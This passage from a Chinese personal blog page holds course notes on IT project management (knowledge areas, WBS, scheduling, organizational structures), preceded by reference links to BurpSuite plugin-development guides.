<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.tuicool.com/articles/aaaa6fA" target="_blank" rel="noopener">BurpSuite插件开发指南之 API 上篇</a><br><a href="http://www.tuicool.com/articles/eU7vUjA" target="_blank" rel="noopener">BurpSuite插件开发指南之 API 下篇</a><br><a href="http://www.php0.net/index.php?a=show&amp;c=index&amp;catid=6&amp;id=19924&amp;m=content" target="_blank" rel="noopener">BurpSuite插件开发指南之Java篇</a><br><a href="http://www.tuicool.com/articles/BF7BNzV" target="_blank" rel="noopener">BurpSuite插件开发指南之 Python 篇</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://ultramangaia.github.io/blog/2017/IT项目管理.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="UltramanGaia">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="UltramanGaia's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/blog/2017/IT项目管理.html" itemprop="url">IT项目管理</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-07T18:00:23+08:00">
                2017-11-07
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/课程/" itemprop="url" rel="index">
                    <span itemprop="name">课程</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="项目属性"><a href="#项目属性" class="headerlink" title="项目属性"></a>项目属性</h1><p>项目有一个特定的目的。所有的项目都要提供一个特定的产品、服务或成果。<br>项目具有临时性。项目有明确的开始和结束时间。<br>项目是通过不断完善细节而逐步开展的。项目一开始通常被定义得很宽泛，随时间流逝项目细节渐渐变得清晰。<br>项目需要来自不同领域的资源。资源包括人员、硬件、软件和其他。<br>项目需要有一个主要用户或项目发起人。他负责提供方向或资金。<br>项目具有不确定性。<br>项目约束<br>项目受范围、时间、成本三者约束，需要权衡。</p>
<h1 id="什么是项目管理"><a href="#什么是项目管理" class="headerlink" title="什么是项目管理"></a>什么是项目管理</h1><p>项目管理指的是”在项目活动中运用专门的知识、技能、工具和技术，以满足项目需求。”</p>
<h1 id="项目管理知识领域"><a href="#项目管理知识领域" class="headerlink" title="项目管理知识领域"></a>项目管理知识领域</h1><p>项目范围管理确定和管理成功完成项目所要做的全部工作。<br>项目时间管理包括项目所需总时间的估算，编写一个可以接受的项目日程进度计划，并确保项目按时完工。<br>项目成本管理包括项目预算的制定和管理工作。<br>项目质量管理是确保项目满足立项所明示或暗示的而需求。<br>项目人力资源管理关注的是如何有效地利用参与项目的人员。<br>项目沟通管理包括产生、收集、发布和保存项目信息。<br>项目风险管理包括对项目相关的风险进行辨识、分析和应对。<br>项目采购管理是指根据项目的需要，从项目实施组织外部获取和购进产品和服务。<br>项目干系人管理包括识别和分析的需求，同时在整个项目生命周期内管理和控制他们的接触。<br>项目综合管理是一个首要的功能，影响所有其他知识领域，也被其他知识领域所影响。</p>
<h1 id="项目管理工具和技术"><a href="#项目管理工具和技术" class="headerlink" title="项目管理工具和技术"></a>项目管理工具和技术</h1><table>
<thead>
<tr>
<th style="text-align:center">知识领域</th>
<th style="text-align:center">工具和技术</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">综合管理</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">范围管理</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">时间管理</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">成本管理</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">质量管理</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">人力资源管理</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">沟通管理</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">风险管理</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">采购管理</td>
</tr>
</tbody>
</table>
<h1 id="项目成功"><a href="#项目成功" class="headerlink" title="项目成功"></a>项目成功</h1><p>项目达到了范围、时间和成本的目标。<br>项目使客户/项目发起人感到满意.<br>项目的结果达到了主要目标。</p>
<h1 id="项目群"><a href="#项目群" class="headerlink" title="项目群"></a>项目群</h1><p>项目群是指一组相互联系的项目，宜使用协同方法进行管理来获得收益和进行控制，而这些是单独管理这些项目时不易获得的。<br>eg.</p>
<ul>
<li>基础框架</li>
<li>应用开发</li>
<li>用户支持<h1 id="项目组合管理"><a href="#项目组合管理" class="headerlink" title="项目组合管理"></a>项目组合管理</h1>战略目标</li>
</ul>
<h1 id="系统管理的三球模型"><a href="#系统管理的三球模型" class="headerlink" title="系统管理的三球模型"></a>系统管理的三球模型</h1><p>业务、组织、技术</p>
<h1 id="组织的四个框架"><a href="#组织的四个框架" class="headerlink" title="组织的四个框架"></a>组织的四个框架</h1><ul>
<li>组织框架<br>涉及组织是如何构建的(用组织图说明)，关注不同团队的角色和责任，以满足高层管理所设定的目标和政策。</li>
<li>人力资源框架<br>聚焦于提供组织需求和人员需求之间的协调。</li>
<li>政治框架<br>解决组织和个人政治的问题。组织中的政治表现为团体或者个体对于权利和领导地位的竞争。</li>
<li>符号框架<br>着重于符号和含义。<h2 id="组织结构"><a href="#组织结构" class="headerlink" title="组织结构"></a>组织结构</h2></li>
</ul>
<ol>
<li>职能型<br><img src="/img/ITproject/1.png" alt=""></li>
<li>项目型<br><img src="/img/ITproject/2.png" alt=""></li>
<li>矩阵型<br><img src="/img/ITproject/3.png" alt=""><h1 id="系统开发生命周期"><a href="#系统开发生命周期" class="headerlink" title="系统开发生命周期"></a>系统开发生命周期</h1></li>
</ol>
<ul>
<li>瀑布式</li>
<li>螺旋式</li>
<li>渐増式</li>
<li>原型</li>
<li>RAD(快速应用开发)<h1 id="敏捷项目管理"><a href="#敏捷项目管理" class="headerlink" title="敏捷项目管理"></a>敏捷项目管理</h1><img src="/img/ITproject/4.png" alt=""></li>
</ul>
<h1 id="项目管理过程组"><a href="#项目管理过程组" class="headerlink" title="项目管理过程组"></a>项目管理过程组</h1><ul>
<li>启动</li>
<li>计划</li>
<li>执行</li>
<li>监控</li>
<li>收尾<h1 id="项目综合管理"><a href="#项目综合管理" class="headerlink" title="项目综合管理"></a>项目综合管理</h1>涉及在整个项目生命周期中协调所有其他项目管理的知识域。</li>
</ul>
<h1 id="战略计划与项目选择"><a href="#战略计划与项目选择" class="headerlink" title="战略计划与项目选择"></a>战略计划与项目选择</h1><h2 id="战略计划"><a href="#战略计划" class="headerlink" title="战略计划"></a>战略计划</h2><p>通过分析组织的优势和劣势，研究在商业环境中的机会和威胁，预测未来的趋势，以及预测对新产品和新服务的需求来确定长期目标。<br>SWOT分析<br>优势、劣势、机会、威胁(可以用思维导图进行分析)</p>
<h1 id="项目范围管理"><a href="#项目范围管理" class="headerlink" title="项目范围管理"></a>项目范围管理</h1><p>对项目包括什么与不包括什么的界定和控制的过程。</p>
<ol>
<li>制定范围管理计划是指确定项目的范围和需求如何管理。</li>
<li>收集需求是指定义并记录项目最终产品的特点和功能。</li>
<li>定义范围是指评审范围管理计划、项目章程、需求文档和组织过程资产来创建一份范围说明书</li>
<li>创建工作分解结构是指将主要的项目可交付成果分解成更细小和更易于管理的部分。</li>
<li>验证范围是指项目可交付成果的正式接受。</li>
<li>控制范围是指对整个项目生命周期内的范围变化进行控制。<h2 id="工作分解结构-WBS-是对项目所涉及工作面向交付成果的分组，它定义了项目的全部范围。"><a href="#工作分解结构-WBS-是对项目所涉及工作面向交付成果的分组，它定义了项目的全部范围。" class="headerlink" title="工作分解结构(WBS)是对项目所涉及工作面向交付成果的分组，它定义了项目的全部范围。"></a>工作分解结构(WBS)是对项目所涉及工作面向交付成果的分组，它定义了项目的全部范围。</h2><h2 id="WBS字典是一个描述WBS每项条目详细信息的文件。"><a href="#WBS字典是一个描述WBS每项条目详细信息的文件。" class="headerlink" title="WBS字典是一个描述WBS每项条目详细信息的文件。"></a>WBS字典是一个描述WBS每项条目详细信息的文件。</h2><h1 id="项目时间管理"><a href="#项目时间管理" class="headerlink" title="项目时间管理"></a>项目时间管理</h1>项目经理们通常认为按时交付项目的需求是最大的挑战之一，也是引起冲突的主要原因。</li>
</ol>
<h1 id="计划进度管理"><a href="#计划进度管理" class="headerlink" title="计划进度管理"></a>计划进度管理</h1><h2 id="活动清单是包含在项目进度中的活动列表。"><a href="#活动清单是包含在项目进度中的活动列表。" class="headerlink" title="活动清单是包含在项目进度中的活动列表。"></a>活动清单是包含在项目进度中的活动列表。</h2><h2 id="项目里程碑是项目中一个通常没有工期的重要事件。"><a href="#项目里程碑是项目中一个通常没有工期的重要事件。" class="headerlink" title="项目里程碑是项目中一个通常没有工期的重要事件。"></a>项目里程碑是项目中一个通常没有工期的重要事件。</h2><h2 id="网络图是表示活动排序的首选技术。"><a href="#网络图是表示活动排序的首选技术。" class="headerlink" title="网络图是表示活动排序的首选技术。"></a>网络图是表示活动排序的首选技术。</h2><h2 id="甘特图提供了一套显示项目进度信息的标准格式。"><a href="#甘特图提供了一套显示项目进度信息的标准格式。" class="headerlink" title="甘特图提供了一套显示项目进度信息的标准格式。"></a>甘特图提供了一套显示项目进度信息的标准格式。</h2><p>##关键路径法<br>关键路径分析是一种网络图技术。</p>
<h1 id="项目成本管理"><a href="#项目成本管理" class="headerlink" title="项目成本管理"></a>项目成本管理</h1><p>包括用来确保在批准的预算范围内完成项目的必要过程。</p>
<h1 id="项目质量管理"><a href="#项目质量管理" class="headerlink" title="项目质量管理"></a>项目质量管理</h1><h1 id="项目人力资源管理"><a href="#项目人力资源管理" class="headerlink" title="项目人力资源管理"></a>项目人力资源管理</h1><h1 id="项目风险管理"><a href="#项目风险管理" class="headerlink" title="项目风险管理"></a>项目风险管理</h1>
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/avatar.jpg"
                alt="UltramanGaia" />
            
              <p class="site-author-name" itemprop="name">UltramanGaia</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">17</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">5</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">10</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          <div class="links-of-author motion-element">
            
          </div>

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2017</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">UltramanGaia</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.3</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>



  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
